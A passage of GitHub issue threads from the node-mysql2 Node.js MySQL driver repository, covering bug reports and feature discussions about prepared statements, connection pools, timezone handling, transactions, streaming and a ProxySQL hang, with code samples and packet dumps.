    <Body>Hi,&#13;
I am getting&#13;
&#13;
&gt;   code: 'ER_PARSE_ERROR',&#13;
&gt;   errno: 1064,&#13;
&#13;
while trying to use [manual prepared statement](https://github.com/sidorares/node-mysql2/blob/master/documentation/Prepared-Statements.md) with a connection that enables `namedPlaceHolders`. Thoughts?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>You are right: https://github.com/sidorares/node-mysql2/blob/5c5aa3aed7e772e599dbefdafb04405672901808/lib/connection.js#L640&#13;
&#13;
It's actually a good place for first contribution. Would you like to give it a go? If not that's fine, I can have a look over weekend</Body>
    </Comment>
    <Comment>
      <Owner>midnightcodr</Owner>
      <Body>Would love to but it might take some time. For now I'll just use cached prepared statement. Thanks for the quick response.</Body>
    </Comment>
  </Issue_481>
  <Issue_482>
    <Repository>node-mysql2</Repository>
    <Title>[Docs] Pool execute or query is automatically create and release a connection</Title>
    <Owner>sidorares</Owner>
    <Body>The docs should mention that methods of connection pool `execute()` and `query()` internally create and release a connection each time it called:&#13;
&#13;
&gt; ```&#13;
&gt; await = pool.execute(query);&#13;
&gt; ```&#13;
&gt; &#13;
&gt; is same as&#13;
&gt; &#13;
&gt; ```&#13;
&gt; const conn = await pool.getConnection();&#13;
&gt; await conn.execute(query);&#13;
&gt; conn.release();&#13;
&gt; ```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>yes, what's your question @mems ?</Body>
    </Comment>
    <Comment>
      <Owner>mems</Owner>
      <Body>Just to add that clarification in docs</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>agreed, just had a look at `/documentation/Promise-Wrapper.md` and we should probably have good detailed api documentation there and not just couple of brief examples</Body>
    </Comment>
    <Comment>
      <Owner>soorajvnair</Owner>
      <Body>Yes this is important, because i've seen people manually accquire and release connection when working with query and execute, which is not necessary as @mems has highlighted. </Body>
    </Comment>
    <Comment>
      <Owner>anthgur</Owner>
      <Body>I agree with this. I went from using `execute` (implicit connection) to using transactions (user managed connection) and I got bit by a pool deadlock.</Body>
    </Comment>
    <Comment>
      <Owner>frenzymind</Owner>
      <Body>what bout if I use 'mysql2/promise'  ?&#13;
connection = await mysql.createConnection({ ... })&#13;
const [rows] = await connection.execute( ...  )&#13;
Should I call connection.end() after ? </Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Should I call connection.end() after ?&#13;
&#13;
@frenzymind depends on your use case, but at some point before you exit from your app you need to close connection.</Body>
    </Comment>
  </Issue_482>
  <Issue_483>
    <Repository>node-mysql2</Repository>
    <Title>feat(pool): Add Minimum connections, and auto close extra connections</Title>
    <Owner>sidorares</Owner>
    <Body>This adds a new configuration for desired minimum connections, to&#13;
complement the connection limit.&#13;
&#13;
If the autoOpenConnections is enabled (default true), the pool will&#13;
immediately open the desired minimum number of connections.&#13;
&#13;
Any connection opened above the minimum, who sits unused for a time&#13;
specified in idleTimeout, will be automatically closed.&#13;
&#13;
This allows you to set up a minimum expectation of standard load for&#13;
connections to your database, but also allow you to configure a&#13;
higher maximum to handle unexpected burst traffic, and be able to&#13;
close them automatically when the burst subsides.</Body>
    <State>open</State>
    <Comment>
      <Owner>aikar</Owner>
      <Body>Github not letting me reopen the previous branch struck yet again (no github you will not change my workflow!)&#13;
&#13;
Given that the memory leak bug is not an issue with node-mysql2, we should be good here now.&#13;
&#13;
Since the last PR, I did discover (in relation to #732) that errors triggered during the initial connection such as setting the timezone, did not bubble back up correctly.&#13;
&#13;
The logic of handling errors upon connection in the auto opened connections has been resolved, by bubbling the error to a pending connection.&#13;
&#13;
I'm not sure what else we could do if theres an error with no pending connections, given that there is no error logging system officially.&#13;
&#13;
I think my next PR will be to configure a general logger interface like I have here: https://github.com/aikar/node-mysql2/commit/b7d624c4fac781e32cdf4b577c98d7040af126fa&#13;
&#13;
But let there be debug/info/error levels.&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>@sidorares confirming that the memory leak fear is completely gone and was related to my own use of URL.&#13;
&#13;
I've been running this for many days now with stable memory.</Body>
    </Comment>
  </Issue_483>
  <Issue_484>
    <Repository>node-mysql2</Repository>
    <Title>connection.ping() resolves with error rather than rejecting</Title>
    <Owner>sidorares</Owner>
    <Body>When using promises, the `connection.ping()` function behaves in a very confusing and counter-intuitive way &#8212; it resolves to an error when the ping fails. Would it not be much better to reject when the ping fails?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>sounds like a bug, will check, thanks!</Body>
    </Comment>
  </Issue_484>
  <Issue_485>
    <Repository>node-mysql2</Repository>
    <Title>Allow setting connection timezone and honor UTC For Date/DateTime</Title>
    <Owner>sidorares</Owner>
    <Body>This resolves #262&#13;
&#13;
if timezone is set, we change the timezone of the connection upon opening.&#13;
&#13;
If timezone is set to utc and not using dateStrings, we create Date objects&#13;
using UTC mode instead.&#13;
&#13;
Also discovered missing config keys that affect packet parsers not&#13;
being included in the cache key for packet parser cache, so added them.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>looks good! Can you add tests for time changes? Not sure what's better way to test, real mysql server or mock server, but we need to test at least one happy path</Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>I'll see if i can over weekend, hopefully won't forget.... was a late night in the office.</Body>
    </Comment>
    <Comment>
      <Owner>jasonlewicki</Owner>
      <Body>Would love to see this pushed along.&#13;
&#13;
I am trying to SELECT TIMESTAMP fields from a MySQL server set to UTC and they are converted into the future by my local machine's TZ offset.</Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>@sidorares Would you be able to add some test for it so we can get this merged? I've been way too busy to find the time to setup testing for this.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@aikar yes, I can work on tests myself. Hope to clean up high priority issues over weekend</Body>
    </Comment>
    <Comment>
      <Owner>aikar</Owner>
      <Body>@jasonlewicki make sure you set timezone: 'utc' in your pool config. This PR will not auto detect timezone settings.&#13;
&#13;
We should follow up with another PR to add (configurable) automatic timezone detection.</Body>
    </Comment>
    <Comment>
      <Owner>kibertoad</Owner>
      <Body>@sidorares Need any help with this PR?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@kibertoad @aikar this is fairly big change, we need at least add some integration tests for this</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>also a bit on the fence about "local" timezone and automatic "SET time_zone = ?" query. If we end up adding this it need at least good documentation, otherwise it will end up being dead code no one uses</Body>
    </Comment>
  </Issue_485>
  <Issue_486>
    <Repository>node-mysql2</Repository>
    <Title>MYSQL2 silently dies on when a pool is initiated with incorrect connectionLimit values</Title>
    <Owner>sidorares</Owner>
    <Body>I had the joy of debugging this for a while. But apparently the mysql2 library appears to have a logic error that will cause it to silently die.&#13;
&#13;
I tracked this down to the use of `Number` to init the variable for the pool config (found at https://github.com/sidorares/node-mysql2/blob/5f0fb8f1f5035e2c0207490aa2f0b838dc82fdc2/lib/pool_config.js ). If for example the variable is a string, such as `"FILL-ME-IN"` this will initialise the value to `NaN`, which will then lead to a logic error further down in the applications pool logic.&#13;
&#13;
I was considering making a patch changing the usage to `parseInt` but you might have some maintainers might have other comments or preferences. This would by default throw on an "unparsable" integer.&#13;
&#13;
Alternatively further checks could be defined to verify that the connectionLimit doesn't end up as `NaN`, or is something satisfying `connectionLimit &gt; -1` or similar.&#13;
&#13;
Example code that will stop silently, this was tested using node 9.3.0 and mysql2 version 1.5.1:&#13;
&#13;
```&#13;
// @ts-check&#13;
const mysql = require('mysql2/promise')&#13;
&#13;
function getSourceDatabaseConfig() {&#13;
    const {&#13;
        S_MYSQL_HOST = '127.0.0.1',&#13;
        S_MYSQL_PORT = '3306',&#13;
        S_MYSQL_USER = 'root',&#13;
        S_MYSQL_PASSWORD = 'sometestpw',&#13;
        S_MYSQL_DATABASE = 'somedb',&#13;
        S_MYSQL_CONNECTIONS = 'FILL-ME-IN'&#13;
    } = process.env&#13;
&#13;
    return {&#13;
        host: S_MYSQL_HOST,&#13;
        port: S_MYSQL_PORT,&#13;
        user: S_MYSQL_USER,&#13;
        password: S_MYSQL_PASSWORD,&#13;
        database: S_MYSQL_DATABASE,&#13;
        connectionLimit: S_MYSQL_CONNECTIONS&#13;
    }&#13;
}&#13;
&#13;
let sourcePool;&#13;
&#13;
function getSourcePool() {&#13;
    if (sourcePool === undefined) {&#13;
        sourcePool = mysql.createPool(getSourceDatabaseConfig());&#13;
    }&#13;
&#13;
    return sourcePool;&#13;
}&#13;
&#13;
&#13;
async function run() {&#13;
    console.log('Executing Data-Mirror')&#13;
&#13;
    const sourcePool = getSourcePool()&#13;
&#13;
    console.log('Checking connections - Source pool')&#13;
    const connSource = await sourcePool.getConnection()&#13;
    console.log('Connection verified')&#13;
}&#13;
&#13;
&#13;
process.on('uncaughtException', err =&gt; {&#13;
    console.error(err)&#13;
    process.exit(1)&#13;
})&#13;
process.on('unhandledRejection', reason =&gt; {&#13;
    console.error(reason)&#13;
    process.exit(1)&#13;
})&#13;
&#13;
process.on('SIGINT', function () {&#13;
    console.error('Got SIGINT')&#13;
    process.exit(0)&#13;
})&#13;
process.on('SIGTERM', function () {&#13;
    console.error('Got SIGTERM')&#13;
    process.exit(0)&#13;
})&#13;
&#13;
run()&#13;
    .then(() =&gt; {&#13;
        console.log('Exiting')&#13;
    })&#13;
    .catch((e) =&gt; {&#13;
        console.log(`Got error from run`, e)&#13;
    })&#13;
&#13;
&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks for report @NinnOgTonic ! We should definitely be more defensive here.&#13;
&#13;
Do you want to volunteer to fix that?  Should be done in connection_config as well</Body>
    </Comment>
  </Issue_486>
  <Issue_487>
    <Repository>node-mysql2</Repository>
    <Title>Queries run with `execute` don't use the global `typeCast` function</Title>
    <Owner>sidorares</Owner>
    <Body>Is this by design or a bug? Ideally I'd like to use prepared statements to absolutely prevent SQL injection attacks but I need to use a custom typecast function because of issues with timezone in #262.&#13;
&#13;
Thanks</Body>
    <State>open</State>
    <Comment>
      <Owner>aikar</Owner>
      <Body>Dupe of my report here: https://github.com/sidorares/node-mysql2/issues/649&#13;
&#13;
See discussion on that issue.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>let's continue discussion here @aikar @coreyjv &#13;
&#13;
suppose the data is coming as (number, date, string) field&#13;
&#13;
What should happen if you call `field.string()` for first field for example? Read it as usual (as number) first, and then return cast as `String(value)`? What you expect as `field.buffer()` result for all three? I suspect underlying binary representation ( say, unsigned 32 bit int for first, 8 byte datetime, lengthcoded int prefixed string for second and third? )&#13;
&#13;
If I place `typeCast` at upper level ( just before returning values, I think this is where it should be) it's much easier to implement but `.buffer()` and `next()` won't be available&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>coreyjv</Owner>
      <Body>Personally I only use the typecast because of #262 where it doesn&#8217;t seem like mysql2 respects the timezone configuration parameter. If I didn&#8217;t have any issues with DATETIME I&#8217;d not use typecast. </Body>
    </Comment>
    <Comment>
      <Owner>coreyjv</Owner>
      <Body>@sidorares are there any updates on this?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>It's still not very obvious to me how to make it compatible between query() and execute()&#13;
&#13;
In query results (almost) all fields are serialized as strings, so what typeCast api suggest is you call `field.string()` to get that internal string representation first and then use that however you want and cast to some other type&#13;
&#13;
In execute result ( so called "binary protocol") each field type has it's own serialization format - length-prefixed 8/16/24/32/64 bit numbers, 8 byte datetime etc etc.&#13;
&#13;
Execute might convert all this to string first when `field.string()` used but that would be mean double conversion and seems silly to me. On the other hand most use cases is to convert only small number of fields that are special to user for some reason so maybe not so silly.&#13;
&#13;
wdyt @coreyjv ?</Body>
    </Comment>
    <Comment>
      <Owner>coreyjv</Owner>
      <Body>@sidorares like I mentioned in my comment if #262 can be fixed then I don't need this feature.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>ok , I'll focus on fixing timezone options and we'll revisit this later</Body>
    </Comment>
  </Issue_487>
  <Issue_488>
    <Repository>node-mysql2</Repository>
    <Title>Knex:warning - Pool2 - Error: This socket has been ended by the other party</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,&#13;
&#13;
I am constantly getting this error in our application nodejs.log. Not sure about impact or how to re-produce this?&#13;
Knex:warning - Pool2 - Error: This socket has been ended by the other party&#13;
&#13;
We are using mysql2 v1.4.2 and node v6.9.1. Seems like related to [https://github.com/sidorares/node-mysql2/issues/289](url) but this is marked as closed.&#13;
&#13;
Thanks &amp; Regards,&#13;
Sanjeev</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>usually this means that other side actively closed connection ( idle timeout on server or similar settings )&#13;
Can you give a bit more description about your setup?</Body>
    </Comment>
    <Comment>
      <Owner>elhigu</Owner>
      <Body>I'm pretty sure this is knex problem of not recognizing dead connection properly. Also knex hasn't used pool2 for a long time so this should be first confirmed in knex side.</Body>
    </Comment>
  </Issue_488>
  <Issue_489>
    <Repository>node-mysql2</Repository>
    <Title>Returning nested rows</Title>
    <Owner>sidorares</Owner>
    <Body>Is it possible to return nested JSON values on queries. For example lets say we have two tables named category and post which are connected together using a FOREIGN KEY. we can use a JOIN in a query and have them in flat rows. but is there a solution to have like an array of posts in each category row to have the posts of that category or vice versa, like having a JSON containing posts. with a nested JSON containing category information?&#13;
Thanks in advance,</Body>
    <State>open</State>
    <Comment>
      <Owner>elhigu</Owner>
      <Body>@manafzar is there a possibility to do that in mysql SQL code? If you can write query that returns nested data from mysql I'm sure that it can be read by mysql2 driver.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@manafzar only thing this library does is what described here: https://github.com/mysqljs/mysql/#joins-with-overlapping-column-names&#13;
&#13;
maybe you can achieve desired behaviour using custom `typeCast` handler. Would you be able to prepare simple self contained example to demonstrate what you want ( including schema creation in population )? &#13;
&#13;
</Body>
    </Comment>
  </Issue_489>
  <Issue_490>
    <Repository>node-mysql2</Repository>
    <Title>Comments with a single apostrophe in queries with parameters raise a syntax error</Title>
    <Owner>sidorares</Owner>
    <Body>The error raised is:&#13;
&gt;  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':id' at line **{insert_line_here}**&#13;
&#13;
&#128308;  **Failing Case 1**&#13;
Simple example&#13;
```&#13;
SELECT id&#13;
FROM users&#13;
WHERE&#13;
-- This comment with a single ' will break the parameter below it&#13;
id = :id;&#13;
```&#13;
&#13;
&#13;
&#128308;  **Failing Case 2**&#13;
Adding additional elements to the query does not affect it&#13;
```&#13;
SELECT id&#13;
FROM users&#13;
WHERE&#13;
username = "you" AND&#13;
-- This comment with a single ' will break the parameter below it&#13;
id = :id;&#13;
```&#13;
&#13;
&#128308;  **Failing Case 3**&#13;
The minimum example&#13;
```&#13;
SELECT id&#13;
FROM users&#13;
WHERE&#13;
-- '&#13;
id = :id;&#13;
```&#13;
&#13;
&#128308;  **Failing Case 4**&#13;
The quote does not need to be right before the parameter&#13;
```&#13;
-- '&#13;
SELECT id&#13;
FROM users&#13;
WHERE&#13;
id = :id;&#13;
```&#13;
&#13;
&#128154;  **Passing Case 1**&#13;
Replace parameter with a literal value&#13;
```&#13;
SELECT id&#13;
FROM users&#13;
WHERE&#13;
-- '&#13;
id = 1;&#13;
```&#13;
&#13;
&#128154; **Passing Case 2**&#13;
Close the single quote&#13;
```&#13;
SELECT id&#13;
FROM users&#13;
WHERE&#13;
-- ''&#13;
id = :id;&#13;
```&#13;
&#13;
&#128154; **Passing Case 3**&#13;
Move the quote after the parameter&#13;
```&#13;
SELECT id&#13;
FROM users&#13;
WHERE&#13;
id = :id;&#13;
-- '&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Currently all query manipulating code ( "?" substitution in `connection.query()`, named placeholders ) are based on simple regexps and not on a full sql parser . Until full parser is added there will be lot's of edge case bugs like that. If you know a good fix happy to land!&#13;
&#13;
More appropriate place to report this is probably https://github.com/mysqljs/named-placeholders/issues</Body>
    </Comment>
    <Comment>
      <Owner>SashaSirotkin</Owner>
      <Body>@sidorares It looks like this bug already has been reported: https://github.com/mysqljs/named-placeholders/issues/9</Body>
    </Comment>
    <Comment>
      <Owner>SashaSirotkin</Owner>
      <Body>If I get a chance, I'll take a look at it.</Body>
    </Comment>
  </Issue_490>
  <Issue_491>
    <Repository>node-mysql2</Repository>
    <Title>Rollback on transaction error</Title>
    <Owner>sidorares</Owner>
    <Body>w.r.t #645 , how to rollback if any error occurs? &#13;
&#13;
Also most of the time I am getting a deadlock and I have to restart my DB even when there are no errors. &#13;
Here is the sample transaction code:&#13;
```javascript &#13;
const conn = null;&#13;
try {&#13;
  conn = await pool.getConnection();&#13;
  await conn.beginTransaction();&#13;
  await conn.query('INSERT INTO ...', params);&#13;
  await conn.commit();&#13;
  conn.release();&#13;
} catch (e) {&#13;
  // rollback here&#13;
}&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'm not 100% sure if `err.fatal` is reported correctly in promise wrapper. If not we should add code similar to #682&#13;
&#13;
```js&#13;
const conn = await pool.getConnection();&#13;
try {&#13;
  await conn.beginTransaction();&#13;
  await conn.query('INSERT INTO ...', params);&#13;
  await conn.commit();&#13;
  conn.release();&#13;
} catch (e) {&#13;
  if (!e.fatal) {&#13;
    conn.rollback();&#13;
    conn.release()&#13;
  }&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>ashokdey</Owner>
      <Body>Thanks! I am trying this method and will let you about it's feasibility</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>looks like `.fatal` is not set ( feel free to submit pr! )&#13;
&#13;
as an alternative you can currently use &#13;
&#13;
```js&#13;
 catch (e) {&#13;
  if (!conn.connection._fatalError) {&#13;
    conn.rollback();&#13;
    conn.release()&#13;
  }&#13;
}&#13;
```&#13;
&#13;
see https://github.com/sidorares/node-mysql2/blob/5f65614a0d61e4ea23d6b1ce0f75548205ba49f7/lib/connection.js#L169&#13;
&#13;
this might become public api soon ( see discussion at https://github.com/tgriesser/knex/pull/2175  ) </Body>
    </Comment>
  </Issue_491>
  <Issue_492>
    <Repository>node-mysql2</Repository>
    <Title>Documentation for Binary Log Protocol Client</Title>
    <Owner>sidorares</Owner>
    <Body>There currently seems to be no documentation of the Binary Log Protocol Client feature...&#13;
&#13;
I'm not there yet, but I will need to know about this feature. &#13;
&#13;
When I do get there, I'll start posting comments here with what I find out.&#13;
&#13;
Please, anyone in the same situation do the same.&#13;
&#13;
At some point these details can be collected and a PR submitted to update documentation.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Yes, binlog client examples / docs are very much needed. If you want to add them please do ( maybe collaborate with @shtse8 on that</Body>
    </Comment>
  </Issue_492>
  <Issue_493>
    <Repository>node-mysql2</Repository>
    <Title>using connection.query(...).stream() with promise wrapper</Title>
    <Owner>sidorares</Owner>
    <Body>why can't I use `connection.query(...).stream() ` with promise wrapper?&#13;
(you get error: TypeError: connection.query(...).stream is not a function)&#13;
&#13;
I'd quite like to be able to do: &#13;
`let q = await connection.query(someSQL);`&#13;
as well as      &#13;
```&#13;
const s1 = connection.query(veryBiqSqlResult).stream();&#13;
s1.on('result', async function(row) {...})&#13;
```&#13;
in the same script, but atm I need promise api for the first and standard api for the second...&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>maybe we need to wait for async generators to land: http://node.green/#ESNEXT-candidate--stage-3--Asynchronous-Iterators-for-await-of-loops&#13;
&#13;
```js&#13;
for await (const row of connection.query(veryBiqSqlResult).stream()) {&#13;
  console.log(row);&#13;
}&#13;
```&#13;
( not sure if I can mix buffering `.query() =&gt; Promise version` with non-buffering detecting that .stream() is added, maybe we need another name: `for await (const row of connection.queryStream(veryBiqSqlResult)) {})&#13;
&#13;
You can access non-promise api from wrapper as `connection.connection` - see https://github.com/sidorares/node-mysql2/blob/97a88530db72c656c16f071a710701ad2830b38d/promise.js#L55&#13;
&#13;
```js&#13;
const [rows] = await connection.query(smallSqlResult);&#13;
await new Promise((accept, reject) =&gt; {&#13;
  const s1 = connection.connection.query(veryBiqSqlResult);&#13;
  s1.on('result', function(row) {...})&#13;
  s1.on('end', accept);&#13;
  s1.on('error', reject);&#13;
})&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>derN3rd</Owner>
      <Body>One note to the connection.connection.query(...).stream() part:&#13;
I had problems with it, until I saw the comment https://github.com/sidorares/node-mysql2/issues/770#issuecomment-381295768&#13;
After removing .stream() it worked perfectly</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Oh, thanks @derN3rd I'll update my example here</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>yes, `stream()` is just to wrap into pipeable object, and _not_ to enable 'result' events, they are emitted anyway</Body>
    </Comment>
  </Issue_493>
  <Issue_494>
    <Repository>node-mysql2</Repository>
    <Title>Promise connection sync methods always proxy non-pool connection</Title>
    <Owner>sidorares</Owner>
    <Body>This is an issue when using a `PromiseConnection` which wraps a `PoolConnection`.  For example:&#13;
```javascript&#13;
const {createPool} = require('mysql2/promise');&#13;
const pool = await createPool(options);&#13;
const connection = await pool.getConnection();&#13;
connection.destroy();&#13;
```&#13;
`destroy` only ever [proxies](https://github.com/sidorares/node-mysql2/blob/6288a4b335e2870f43cc3c44f73abae70ba3d4ee/promise.js#L258) `Connection.prototype.destroy`, not `PoolConnection.prototype.destroy`, so the connection isn't removed from the pool.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks. Would you be able to make unit test covering this?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>do you think #674 fixed this @c24w ?</Body>
    </Comment>
    <Comment>
      <Owner>c24w</Owner>
      <Body>@sidorares #674 fixed the exact issue I was seeing; however, this is the more generic issue that connections originating from a `PromisePool` are inheriting methods from `Connection`, not `PoolConnection`.  My PR addressed this for the `destroy` method, but there may be others.</Body>
    </Comment>
  </Issue_494>
  <Issue_495>
    <Repository>node-mysql2</Repository>
    <Title>mysql2 query to proxysql hangs</Title>
    <Owner>sidorares</Owner>
    <Body>Using nodejs 8.7.0, mysql2 1.4.2 and proxysql 1.4.3 queries are hanging.&#13;
&#13;
All on Ubuntu 16.04.&#13;
&#13;
If we test the same setup with mysql against proxysql, we get the expected result.&#13;
&#13;
We have made a simple test case:&#13;
```&#13;
var mysql = require('mysql2')&#13;
&#13;
var config = {&#13;
  host: 'dev-db',&#13;
  user: 'bob',&#13;
  password: 'alice',&#13;
  database: 'spiddb',&#13;
  port: 6033,&#13;
  supportBigNumbers: true,&#13;
  timezone: 'Z'&#13;
}&#13;
&#13;
var main = function () {&#13;
  try {&#13;
    const db = mysql.createConnection(config)&#13;
    db.query('SELECT * from testtable;', function (err, rows, fields) {&#13;
      if (err) {&#13;
        console.log(err)&#13;
      } else {&#13;
        console.log('rows =&gt; ', rows)&#13;
        db.close()&#13;
      }&#13;
    })&#13;
  } catch (err) {&#13;
    console.log(err)&#13;
  }&#13;
}&#13;
&#13;
main()&#13;
```&#13;
&#13;
Changing "mysql2" to "mysql" and port from "3306" (mysql) to "6033" (proxysql) yields the following results:&#13;
mysql and 3306 success&#13;
mysql2 and 3306 success&#13;
mysql and 6033 success&#13;
mysql2 and 6033 fail (hangs)&#13;
&#13;
This is a tcpdump of mysql2 to proxysql:&#13;
```&#13;
10:15:56.196138 IP dev-db.6033 &gt; dev-app.50548: Flags [.], ack 70, win 227, options [nop,nop,TS val 64120310 ecr 64119311], length 0&#13;
 0x0000:  4500 0034 17ac 4000 4006 ac78 c0a8 7a73  E..4..@.@..x..zs&#13;
 0x0010:  c0a8 7adb 1791 c574 cfc7 72a6 c944 6321  ..z....t..r..Dc!&#13;
 0x0020:  8010 00e3 76c6 0000 0101 080a 03d2 65f6  ....v.........e.&#13;
 0x0030:  03d2 620f                                ..b.&#13;
&#13;
10:15:56.196378 IP dev-db.6033 &gt; dev-app.50548: Flags [P.], seq 79:90, ack 70, win 227, options [nop,nop,TS val 64120310 ecr 64119311], length 11&#13;
 0x0000:  4500 003f 17ad 4000 4006 ac6c c0a8 7a73  E..?..@.@..l..zs&#13;
 0x0010:  c0a8 7adb 1791 c574 cfc7 72a6 c944 6321  ..z....t..r..Dc!&#13;
 0x0020:  8018 00e3 76d1 0000 0101 080a 03d2 65f6  ....v.........e.&#13;
 0x0030:  03d2 620f 0700 0002 0000 0000 0000 00    ..b............&#13;
&#13;
10:15:56.197087 IP dev-app.50548 &gt; dev-db.6033: Flags [P.], seq 70:99, ack 90, win 229, options [nop,nop,TS val 64119312 ecr 64120310], length 29&#13;
 0x0000:  4500 0051 00da 4000 4006 c32d c0a8 7adb  E..Q..@.@..-..z.&#13;
 0x0010:  c0a8 7a73 c574 1791 c944 6321 cfc7 72b1  ..zs.t...Dc!..r.&#13;
 0x0020:  8018 00e5 76e3 0000 0101 080a 03d2 6210  ....v.........b.&#13;
 0x0030:  03d2 65f6 1900 0000 0353 454c 4543 5420  ..e......SELECT.&#13;
 0x0040:  2a20 6672 6f6d 2074 6573 7474 6162 6c65  *.from.testtable&#13;
 0x0050:  3b                                       ;&#13;
&#13;
10:15:56.235722 IP dev-db.6033 &gt; dev-app.50548: Flags [.], ack 99, win 227, options [nop,nop,TS val 64120320 ecr 64119312], length 0&#13;
 0x0000:  4500 0034 17ae 4000 4006 ac76 c0a8 7a73  E..4..@.@..v..zs&#13;
 0x0010:  c0a8 7adb 1791 c574 cfc7 72b1 c944 633e  ..z....t..r..Dc&gt;&#13;
 0x0020:  8010 00e3 76c6 0000 0101 080a 03d2 6600  ....v.........f.&#13;
 0x0030:  03d2 6210                                ..b.&#13;
```&#13;
&#13;
This is a tcpdump of mysql to proxysql:&#13;
```&#13;
10:14:32.309504 IP dev-app.50544 &gt; dev-db.6033: Flags [P.], seq 70:99, ack 90, win 229, options [nop,nop,TS val 64098340 ecr 64099338], length 29&#13;
 0x0000:  4500 0051 31c7 4000 4006 9240 c0a8 7adb  E..Q1.@.@..@..z.&#13;
 0x0010:  c0a8 7a73 c570 1791 d6d0 2226 a15a 2e09  ..zs.p...."&amp;.Z..&#13;
 0x0020:  8018 00e5 76e3 0000 0101 080a 03d2 1024  ....v..........$&#13;
 0x0030:  03d2 140a 1900 0000 0353 454c 4543 5420  .........SELECT.&#13;
 0x0040:  2a20 6672 6f6d 2074 6573 7474 6162 6c65  *.from.testtable&#13;
 0x0050:  3b                                       ;&#13;
&#13;
10:14:32.310154 IP dev-db.6033 &gt; dev-app.50544: Flags [P.], seq 90:173, ack 99, win 227, options [nop,nop,TS val 64099338 ecr 64098340], length 83&#13;
 0x0000:  4500 0087 39bc 4000 4006 8a15 c0a8 7a73  E...9.@.@.....zs&#13;
 0x0010:  c0a8 7adb 1791 c570 a15a 2e09 d6d0 2243  ..z....p.Z...."C&#13;
 0x0020:  8018 00e3 7719 0000 0101 080a 03d2 140a  ....w...........&#13;
 0x0030:  03d2 1024 0100 0001 0132 0000 0203 6465  ...$.....2....de&#13;
 0x0040:  6606 7370 6964 6462 0974 6573 7474 6162  f.spiddb.testtab&#13;
 0x0050:  6c65 0974 6573 7474 6162 6c65 0269 6402  le.testtable.id.&#13;
 0x0060:  6964 0c3f 000b 0000 0003 0080 0000 0005  id.?............&#13;
 0x0070:  0000 03fe 0000 2200 0200 0004 0131 0500  ......"......1..&#13;
 0x0080:  0005 fe00 0022 00                        .....".&#13;
&#13;
10:14:32.315155 IP dev-app.50544 &gt; dev-db.6033: Flags [F.], seq 99, ack 173, win 229, options [nop,nop,TS val 64098341 ecr 64099338], length 0&#13;
 0x0000:  4500 0034 31c8 4000 4006 925c c0a8 7adb  E..41.@.@..\..z.&#13;
 0x0010:  c0a8 7a73 c570 1791 d6d0 2243 a15a 2e5c  ..zs.p...."C.Z.\&#13;
 0x0020:  8011 00e5 76c6 0000 0101 080a 03d2 1025  ....v..........%&#13;
 0x0030:  03d2 140a                                ....&#13;
&#13;
10:14:32.315270 IP dev-db.6033 &gt; dev-app.50544: Flags [F.], seq 173, ack 100, win 227, options [nop,nop,TS val 64099339 ecr 64098341], length 0&#13;
 0x0000:  4500 0034 39bd 4000 4006 8a67 c0a8 7a73  E..49.@.@..g..zs&#13;
 0x0010:  c0a8 7adb 1791 c570 a15a 2e5c d6d0 2244  ..z....p.Z.\.."D&#13;
 0x0020:  8011 00e3 76c6 0000 0101 080a 03d2 140b  ....v...........&#13;
 0x0030:  03d2 1025                                ...%&#13;
&#13;
10:14:32.315456 IP dev-app.50544 &gt; dev-db.6033: Flags [.], ack 174, win 229, options [nop,nop,TS val 64098341 ecr 64099339], length 0&#13;
 0x0000:  4500 0034 31c9 4000 4006 925b c0a8 7adb  E..41.@.@..[..z.&#13;
 0x0010:  c0a8 7a73 c570 1791 d6d0 2244 a15a 2e5d  ..zs.p...."D.Z.]&#13;
 0x0020:  8010 00e5 76c6 0000 0101 080a 03d2 1025  ....v..........%&#13;
 0x0030:  03d2 140b  &#13;
```&#13;
If you need it, we can setup a virtual host and provide you access to this for testing and debugging. Or we can test patches for you.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks for report! I'll try to install proxysql locally. If you can make dockerfile with test setup that would help as well</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>So after initial research we figured out that at least when charset is set to `UTF8_GENERAL_CI` ( same as mysqljs/mysql uses ) queries do finish</Body>
    </Comment>
    <Comment>
      <Owner>TKsect</Owner>
